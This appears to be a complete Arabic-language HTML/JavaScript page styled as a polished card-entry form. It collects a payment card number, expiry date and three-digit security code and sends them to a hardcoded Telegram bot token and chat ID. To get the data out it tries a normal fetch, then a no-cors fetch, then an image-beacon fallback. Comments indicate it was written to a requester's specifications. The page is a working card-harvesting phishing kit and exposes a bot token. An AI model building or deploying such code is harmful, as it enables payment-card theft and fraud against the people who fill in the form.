<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تطبيق إرسال إلى تلجرام - فاتح</title>

  <style>
    :root{
      --bg: #f5f8fb;
      --panel: #ffffff;
      --muted: #6b7280;
      --accent-1: #06b6d4; /* teal */
      --accent-2: #3b82f6; /* blue */
      --success: #059669;
      --danger: #ef4444;
      --card-height: 220px;
      --radius-app: 16px;
      --shadow-lg: 0 14px 40px rgba(15,23,42,0.08);
      --shadow-sm: 0 6px 18px rgba(15,23,42,0.06);
    }

    * { box-sizing: border-box; }
    html,body { height:100%; margin:0; font-family: "Inter", "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
    body {
      background: linear-gradient(180deg, #eef5fb 0%, var(--bg) 100%);
      color: #0f1724;
      padding: 28px;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
    }

    /* App shell */
    .app {
      width:100%;
      max-width:980px;
      border-radius:var(--radius-app);
      overflow:hidden;
      background: transparent;
      display:grid;
      grid-template-columns: 1fr 420px;
      gap:22px;
      padding:18px;
      align-items:start;
    }

    @media (max-width:920px){
      .app { grid-template-columns: 1fr; padding:14px; gap:14px; }
      .right { order:-1; }
    }

    /* Left / Form column */
    .left {
      padding:18px;
      background: var(--panel);
      border-radius:12px;
      border:1px solid rgba(15,23,42,0.04);
      box-shadow: var(--shadow-lg);
    }

    .brand {
      display:flex;
      align-items:center;
      gap:12px;
      margin-bottom:12px;
    }
    .logo {
      width:48px;height:48px;border-radius:10px;
      background: linear-gradient(135deg,var(--accent-1),var(--accent-2));
      display:flex;align-items:center;justify-content:center;
      box-shadow: var(--shadow-sm);
      flex-shrink:0;
      color: white;
      font-weight:700;
    }
    .brand h1 { margin:0; font-size:18px; color:#0b1220; }
    .brand p { margin:0; font-size:13px; color:var(--muted); }

    form { margin-top:12px; display:flex; flex-direction:column; gap:14px; }

    .field {
      display:flex; flex-direction:column; gap:8px;
    }
    label.inline {
      display:flex; align-items:center; gap:10px; font-weight:700; color:#0b1220;
      font-size:13px;
    }
    .input {
      display:flex; align-items:center; gap:10px;
      background: #f8fafc;
      border-radius:10px;
      padding:10px 12px;
      border:1px solid rgba(15,23,42,0.04);
      transition: box-shadow .12s, transform .06s, border-color .12s;
    }
    .input:focus-within { box-shadow: 0 10px 30px rgba(59,130,246,0.06); border-color: rgba(59,130,246,0.16); transform: translateY(-1px); }

    input[type="text"], input[type="tel"] {
      border:0; background:transparent; outline:none; color: #0b1220; font-size:16px; width:100%;
    }
    input::placeholder { color: rgba(11,18,32,0.35); }

    .two-cols { display:flex; gap:12px; }
    .two-cols > div { flex:1; }

    .hint { font-size:12px; color:var(--muted); margin-top:6px; }

    .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
    button.send {
      padding:12px 16px;
      border-radius:12px;
      border:0;
      color:white;
      font-weight:800;
      background: linear-gradient(90deg,var(--accent-1),var(--accent-2));
      box-shadow: 0 10px 24px rgba(59,130,246,0.12);
      cursor:pointer;
      transition: transform .12s, opacity .12s;
      font-size:15px;
    }
    button.send:active { transform: translateY(-1px); }
    button.ghost {
      background: transparent;
      border: 1px solid rgba(15,23,42,0.06);
      color: var(--muted);
      padding:10px 12px;
      border-radius:10px;
      cursor:pointer;
    }

    #message { min-height:26px; font-size:14px; color:var(--muted); }
    #message.info { color:var(--accent-2); }
    #message.success { color:var(--success); }
    #message.error { color:var(--danger); }

    .note {
      margin-top:10px;
      font-size:13px;
      color:var(--muted);
      background: rgba(11,18,32,0.02);
      padding:10px; border-radius:10px;
    }

    /* Right / Preview column */
    .right {
      padding:18px;
      border-radius:12px;
      background: var(--panel);
      border:1px solid rgba(15,23,42,0.04);
      box-shadow: var(--shadow-lg);
      display:flex; flex-direction:column; gap:12px;
      height:100%;
    }

    .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
    .preview-header h3 { margin:0; font-size:16px; color:#0b1220; }
    .preview-header .muted { color:var(--muted); font-size:13px; }

    .card-preview {
      height: var(--card-height);
      border-radius:12px;
      overflow:hidden;
      position:relative;
      padding:18px;
      background: linear-gradient(180deg,#ffffff 0%, #f8fafc 100%);
      box-shadow: 0 10px 30px rgba(15,23,42,0.04);
      display:flex; flex-direction:column; justify-content:space-between;
    }

    .card-surface {
      border-radius:10px;
      padding:16px;
      color:#08203a;
      display:flex; flex-direction:column; gap:10px;
      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(6,182,212,0.06));
      min-height:120px;
      border: 1px solid rgba(11,18,32,0.03);
    }

    .card-top { display:flex; justify-content:space-between; align-items:center; }
    .chip { width:46px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: 0 6px 18px rgba(0,0,0,0.06); }

    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:#04263a; }
    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; color:#04263a; }

    .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
    .label { font-size:11px; color: rgba(4,6,12,0.6); }
    .value { font-weight:800; color:#04263a; }

    .micro { font-size:12px; color:rgba(4,6,12,0.7); }

    .row { display:flex; gap:8px; align-items:center; }
    .grow { flex:1; }

    .success-burst {
      position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none;
      opacity:0; transform:scale(0.98); transition:opacity .32s, transform .32s;
    }
    .success-burst.show { opacity:1; transform:scale(1); }
    .check {
      width:82px; height:82px; border-radius:50%; background:rgba(5,150,105,0.08); display:flex; align-items:center; justify-content:center;
      border: 2px solid rgba(5,150,105,0.12);
      box-shadow: 0 8px 28px rgba(5,150,105,0.06);
      color: var(--success); font-size:38px; font-weight:800;
    }

    @media (max-width:520px){
      .card-number { font-size:18px; }
      .brand h1 { font-size:16px; }
      .card-surface { padding:12px; }
    }
  </style>
</head>
<body>
  <div class="app" role="application" aria-label="تطبيق إرسال إلى تلجرام">
    <div class="left" role="region" aria-labelledby="appTitle">
      <div class="brand">
        <div class="logo" aria-hidden>TB</div>
        <div>
          <h1 id="appTitle">نموذج إرسال إلى تلجرام</h1>
          <p>واجهة فاتحة، منظمة، ومظهر شبه تطبيقي — البيانات تظهر بشكل رسمي في معاينة البطاقة أعلاه.</p>
        </div>
      </div>

      <form id="form" autocomplete="on" novalidate>
        <!-- Card number (LTR input even on RTL page) -->
        <div class="field">
          <label class="inline">
            <span>رقم البطاقة (16 رقم)</span>
          </label>
          <div class="input" title="أدخل 16 رقمًا">
            <!-- direction ltr for numeric input -->
            <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                   placeholder="0000 0000 0000 0000" aria-describedby="idHint"
                   dir="ltr" style="text-align:left;" />
          </div>
          <div id="idHint" class="hint">الكتابة ستكون من اليسار إلى اليمين — يتم تنسيق الأرقام تلقائيًا بمجموعات 4.</div>
        </div>

        <div class="two-cols">
          <div class="field">
            <label class="inline"><span>تاريخ الانتهاء (MM/YY أو MM/YYYY)</span></label>
            <div class="input">
              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY أو MM/YYYY" maxlength="7" autocomplete="cc-exp" />
            </div>
            <div class="hint">مثال مقبول: 01/28 أو 01/2028</div>
          </div>

          <div class="field">
            <label class="inline"><span>الرقم (3 خانات)</span></label>
            <div class="input">
              <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
            </div>
            <div class="hint">مثال: 123</div>
          </div>
        </div>

        <div class="actions">
          <button class="send" id="sendBtn" type="submit">إرسال إلى تلجرام</button>
          <button type="button" class="ghost" id="clearBtn" title="مسح الحقول">مسح</button>
          <div id="message" role="status" aria-live="polite" class="grow"></div>
        </div>

        <p class="note">
          تنبيه: التوكن و chat_id مضمّنان داخل هذا الملف كما طلبت — هذا غير آمن إذا نُشر في مكان عام. استخدمه محليًا أو غيّر التوكن إذا نشرته.
        </p>
      </form>
    </div>

    <aside class="right" role="region" aria-labelledby="previewTitle">
      <div class="preview-header">
        <div>
          <h3 id="previewTitle">معاينة رسمية للبيانات</h3>
          <div class="muted">المعلومات تظهر بشكل منسق ورسمي في البطاقة — لا يوجد نص رسالة مرئي أدنى.</div>
        </div>

        <div style="display:flex; gap:10px;">
          <button id="toggleMask" class="ghost" title="إظهار/إخفاء الرقم">إخفاء الرقم</button>
        </div>
      </div>

      <div class="card-preview" aria-hidden="false">
        <div class="card-surface" id="cardSurface" role="img" aria-label="معاينة بطاقة">
          <div class="card-top">
            <div class="chip" aria-hidden></div>
            <div class="micro">Telegram Bot</div>
          </div>

          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr" style="text-align:left;">•••• •••• •••• ••••</div>

          <div class="card-meta">
            <div class="meta-block">
              <div class="label">تاريخ الانتهاء</div>
              <div class="value" id="cardExpiry">MM/YY</div>
            </div>
            <div class="meta-block">
              <div class="label">الرقم (3)</div>
              <div class="value" id="cardThree">•••</div>
            </div>
          </div>
        </div>

        <div class="success-burst" id="successBurst" aria-hidden="true">
          <div class="check" aria-hidden>✓</div>
        </div>
      </div>

      <!-- Removed visible "نص الرسالة المرسلة" area as requested -->
    </aside>
  </div>

  <script>
    /************************************************
     * إعداد التوكن والـ chat id هنا (كما طلبت)
     * تذكير: ظهورهما في الكود يجعلانهما مكشوفين.
     ************************************************/
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";

    // Elements
    const form = document.getElementById('form');
    const idInput = document.getElementById('idNumber');
    const expiryInput = document.getElementById('expiry');
    const threeInput = document.getElementById('threeDigits');
    const msg = document.getElementById('message');
    const sendBtn = document.getElementById('sendBtn');
    const clearBtn = document.getElementById('clearBtn');

    const pNumber = document.getElementById('cardNumber');
    const pExpiry = document.getElementById('cardExpiry');
    const pThree = document.getElementById('cardThree');
    const successBurst = document.getElementById('successBurst');
    const toggleMask = document.getElementById('toggleMask');

    let maskEnabled = true;

    // helpers
    function showMessage(text, cls='info') {
      msg.className = cls;
      msg.textContent = text;
    }

    function rawDigits(v='') {
      return (v||'').toString().replace(/\D/g, '');
    }

    // Format card number with groups of 4, input left-to-right
    idInput.addEventListener('input', (e) => {
      const prev = e.target.value;
      let digits = rawDigits(prev).slice(0,16);
      const parts = digits.match(/.{1,4}/g) || [];
      const display = parts.join(' ');
      e.target.value = display;
      updatePreview();
    });

    // Expiry input: accept MMYY, MM/YYYY, MM/YY
    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/[^\d]/g,'');
      if (v.length > 6) v = v.slice(0,6);

      if (v.length <= 2) {
        e.target.value = v;
      } else if (v.length <= 4) {
        // format MMYY -> MM/YY
        e.target.value = v.slice(0,2) + '/' + v.slice(2);
      } else {
        // format MMYYYY -> MM/YYYY
        e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
      }
      updatePreview();
    });

    // three digits
    threeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
      updatePreview();
    });

    // Toggle mask (show full number or masked)
    toggleMask.addEventListener('click', () => {
      maskEnabled = !maskEnabled;
      toggleMask.textContent = maskEnabled ? 'إخفاء الرقم' : 'إظهار الرقم';
      updatePreview();
    });

    // Build message text for sending (compact, without emoji/labels as requested)
    function buildMessageText() {
      const idVal = rawDigits(idInput.value);
      const expVal = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
      const threeVal = threeInput.value || '';
      // compact single-line format, no emoji and no verbose labels
      return `${idVal} | ${expVal} | ${threeVal}`;
    }

    // normalize expiry text to MM/YYYY (for sending)
    function normalizeExpiryForSend(display) {
      if (!display) return '';
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return display;
      const mm = m[1];
      const yy = m[2];
      if (yy.length === 2) {
        // interpret as 20YY
        return `${mm}/${String(2000 + parseInt(yy,10))}`;
      } else {
        return `${mm}/${yy}`;
      }
    }

    // Validate functions
    function validateId(idDisplay) {
      return /^\d{16}$/.test(rawDigits(idDisplay));
    }

    // Accept MM/YY or MM/YYYY (also accept values like 0128 or 01/28)
    function validateExpiry(display) {
      if (!display) return false;
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return false;
      const mm = parseInt(m[1],10);
      let yyyy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
      if (mm < 1 || mm > 12) return false;
      // last moment of that month
      const last = new Date(yyyy, mm, 0, 23, 59, 59);
      return last > new Date();
    }

    function validateThree(v) {
      return /^\d{3}$/.test(v);
    }

    // Masking for preview: show only last 4 digits (if masked)
    function maskedDisplay(display) {
      const digits = rawDigits(display);
      if (!digits) return '•••• •••• •••• ••••';
      const padded = (digits + '••••••••••••••••').slice(0,16);
      const groups = padded.match(/.{1,4}/g) || [];
      if (!maskEnabled) return groups.join(' ');
      // keep last group visible, mask others
      const masked = groups.map((g, idx) => idx < 3 ? g.replace(/\d/g,'•') : g);
      return masked.join(' ');
    }

    // Update preview and values on card
    function updatePreview() {
      pNumber.textContent = maskedDisplay(idInput.value);
      pExpiry.textContent = expiryInput.value || 'MM/YY';
      pThree.textContent = threeInput.value ? threeInput.value.replace(/./g,'•') : '•••';
    }

    // initialize
    updatePreview();

    // clear
    clearBtn.addEventListener('click', () => {
      form.reset();
      maskEnabled = true;
      toggleMask.textContent = 'إخفاء الرقم';
      showMessage('', '');
      updatePreview();
    });

    // send logic (with same fallback approach)
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      showMessage('', '');
      const idVal = rawDigits(idInput.value);
      const expRaw = expiryInput.value.trim();
      const expForSend = normalizeExpiryForSend(expRaw);
      const threeVal = threeInput.value.trim();

      if (!validateId(idInput.value)) {
        showMessage('الرقم التعريفي يجب أن يتكوّن من 16 رقمًا.', 'error');
        return;
      }
      if (!validateExpiry(expRaw)) {
        showMessage('تاريخ الانتهاء يجب أن يكون MM/YY أو MM/YYYY ويكون في المستقبل.', 'error');
        return;
      }
      if (!validateThree(threeVal)) {
        showMessage('حقل الثلاث خانات يجب أن يحتوي على 3 أرقام.', 'error');
        return;
      }

      // Build compact message (no emoji, no labels) — as requested the verbose message was removed.
      const text = buildMessageText();

      const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      });
      const url = `${base}?${params.toString()}`;

      showMessage('جاري الإرسال...', 'info');
      sendBtn.disabled = true;
      sendBtn.style.opacity = '0.7';

      // 1) try normal fetch
      try {
        const resp = await fetch(url, { method: 'GET' });
        if (resp && resp.ok) {
          const j = await resp.json();
          if (j.ok) {
            showMessage('تم الإرسال بنجاح.', 'success');
            triggerSuccess();
            form.reset();
            updatePreview();
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          } else {
            showMessage('تلجرام أعاد خطأ: ' + (j.description || JSON.stringify(j)), 'error');
            sendBtn.disabled = false;
            sendBtn.style.opacity = '1';
            return;
          }
        }
      } catch (err) {
        console.warn('fetch normal failed, will try fallback methods.', err);
      }

      // 2) try no-cors fetch (may send but cannot read response)
      try {
        await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
        showMessage('تم إرسال الطلب إلى Telegram (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.warn('fetch no-cors failed, trying Image fallback.', err);
      }

      // 3) image fallback
      try {
        await new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve(true);
          img.onerror = () => resolve(true);
          img.src = url + "&_=" + Date.now();
          setTimeout(() => resolve(true), 4000);
        });
        showMessage('تم إرسال الطلب إلى Telegram (عن طريق طريقة بديلة).', 'success');
        triggerSuccess();
        form.reset();
        updatePreview();
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
        return;
      } catch (err) {
        console.error(err);
        showMessage('فشل إرسال الطلب. تحقق من اتصال الانترنت أو إعدادات المتصفح.', 'error');
        sendBtn.disabled = false;
        sendBtn.style.opacity = '1';
      }
    });

    // Success visual (burst)
    function triggerSuccess() {
      successBurst.classList.add('show');
      successBurst.setAttribute('aria-hidden','false');
      setTimeout(() => {
        successBurst.classList.remove('show');
        successBurst.setAttribute('aria-hidden','true');
      }, 1500);
    }

    // Accessibility: announce preview changes
    idInput.addEventListener('keyup', updatePreview);
    expiryInput.addEventListener('keyup', updatePreview);
    threeInput.addEventListener('keyup', updatePreview);

    // Keep cursor at end for LTR input in RTL page (convenience)
    idInput.addEventListener('focus', () => { setTimeout(()=> { idInput.selectionStart = idInput.selectionEnd = idInput.value.length; }, 0); });
  </script>
</body>
</html>